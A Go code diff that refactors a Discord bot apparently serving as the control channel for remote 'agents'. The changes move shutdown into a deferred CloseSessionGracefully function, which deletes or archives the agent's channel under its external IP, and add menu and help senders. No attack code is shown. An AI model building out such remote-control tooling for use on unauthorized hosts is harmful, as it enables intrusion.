@@ -51,12 +51,14 @@ func Init(newAgent *agent.Agent) {
 		// Failed to initialize the Bot, therefore we cannot proceed.
 		return
 	}
+	// Close the Discord Session (channel & bot) at the end of the program.
+	defer discordBot.CloseSessionGracefully()
 
 	// Add message handler to listen for valid commands.
 	discordBot.Session.AddHandler(discordBot.CommandHandler)
 
 	go func() {
-		// Send a heartbeat every so often (defined by HEARTBEAT_TIME)
+		// Send a heartbeat every so often (defined by HEARTBEAT_TIME).
 		ticker := time.NewTicker(HEARTBEAT_TIME)
 		for {
 			<-ticker.C
@@ -73,15 +75,9 @@ func Init(newAgent *agent.Agent) {
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
 	<-sc
-
-	discordBot.CloseAgentChannel()
-
-	// Cleanly close down the Discord session.
-	discordBot.Session.Close()
 }
 
-// NewDiscordSession configures and returns a new Discord Bot and Session
-// for the passed client.
+// NewDiscordSession configures and returns a new Discord Bot and Session for the passed client.
 func NewDiscordSession(agent agent.Agent) (*DiscordSession, error) {
 	// Create a Discord session (DiscordGo) with the Bot token.
 	discordSession, err := discordgo.New("Bot " + util.BotToken)
@@ -114,17 +110,9 @@ func NewDiscordSession(agent agent.Agent) (*DiscordSession, error) {
 	}, nil
 }
 
-// SendCommandMenu sends the Menu embed message containing the Bots commands and their descriptions.
-func (discordBot *DiscordSession) SendCommandMenu() {
-	// Construct and send the embed.
-	_, err := discordBot.Session.ChannelMessageSendEmbed(discordBot.ChannelID.ID, construct.ConstructMenuEmbed())
-	if err != nil {
-		fmt.Println(err)
-	}
-}
-
-// CloseAgentChannel exits the agents command channel by deleting or archiving it.
-func (discordBot *DiscordSession) CloseAgentChannel() {
+// CloseSessionGracefully exits the agents channel and closes the Discord Session gracefully.
+func (discordBot *DiscordSession) CloseSessionGracefully() {
+	// Cleanly close down the agent channel.
 	if util.DeleteOnExit {
 		// Delete the channel if configurated to.
 		discordBot.Session.ChannelDelete(discordBot.ChannelID.ID)
@@ -133,6 +121,26 @@ func (discordBot *DiscordSession) CloseAgentChannel() {
 		newChannelName := fmt.Sprintf("archive-%s", discordBot.Agent.ExternalIP)
 		discordBot.Session.ChannelEdit(discordBot.ChannelID.ID, newChannelName)
 	}
+
+	// Cleanly close down the Discord session.
+	discordBot.Session.Close()
+
+	// Exit the program.
+	os.Exit(0)
+}
+
+// SendCommandMenu sends the Menu embed message containing the Bots commands and their descriptions.
+func (discordBot *DiscordSession) SendCommandMenu() {
+	// Construct and send the Menu embed.
+	menuEmbed := construct.ConstructMenuEmbed()
+	discordBot.Session.ChannelMessageSendEmbed(discordBot.ChannelID.ID, menuEmbed)
+}
+
+// SendHelpMenu sends the Help embed message containing useful information about the program.
+func (discordBot *DiscordSession) SendHelpMenu() {
+	// Construct and send the Help embed.
+	helpEmbed := construct.ConstructHelpEmbed()
+	discordBot.Session.ChannelMessageSendEmbed(discordBot.ChannelID.ID, helpEmbed)
 }
 
 // SendHeartBeat sends a heartbeat message to make sure there is no bot timeout.
